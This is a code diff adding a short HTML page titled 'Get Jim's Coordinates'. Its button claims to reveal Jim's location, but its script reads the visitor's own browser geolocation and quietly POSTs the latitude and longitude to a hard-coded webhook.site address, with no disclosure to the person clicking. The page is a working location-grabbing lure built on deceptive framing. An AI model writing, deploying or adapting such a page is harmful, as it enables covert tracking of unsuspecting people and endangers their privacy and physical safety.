@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Get Jim's Coordinates</title>
+</head>
+<body>
+    <h1>Click Jim</h1>
+    <p>Click the button to get Jim's coordinates.</p>
+
+    <button onclick="getLocation()">Jim</button>
+
+    <p id="demo"></p>
+
+    <script>
+        const webhookUrl = 'https://webhook.site/cde60901-21ff-4bd7-8d34-1f29471228a7'; // Your webhook URL
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition);
+            } else { 
+                document.getElementById('demo').innerText = "Geolocation is not supported by this browser.";
+            }
+        }
+
+        function showPosition(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+
+            // Display the coordinates
+            document.getElementById('demo').innerText = "Latitude: " + latitude + 
+                "\nLongitude: " + longitude;
+
+            // Send the coordinates to the webhook
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    latitude: latitude,
+                    longitude: longitude
+                })
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.json();
+            })
+            .then(data => {
+                console.log('Coordinates logged successfully:', data);
+            })
+            .catch(error => {
+                console.error('Error sending coordinates to webhook:', error);
+            });
+        }
+    </script>
+</body>
+</html>
